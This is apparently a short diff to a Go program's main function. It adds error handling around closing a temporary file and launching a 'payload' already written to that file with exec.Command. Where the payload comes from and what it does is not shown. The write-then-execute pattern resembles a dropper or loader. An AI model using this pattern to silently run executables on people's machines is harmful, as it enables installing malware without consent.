@@ -97,7 +97,9 @@ func main() {
 		return
 	}
 	tmpPath := tmpFile.Name()
-	tmpFile.Close()
+	_ = tmpFile.Close() // best-effort cleanup; the payload was already written
 
-	exec.Command(tmpPath).Start()
+	if err := exec.Command(tmpPath).Start(); err != nil {
+		os.Stderr.WriteString("error starting payload: " + err.Error() + "\n")
+	}
 }
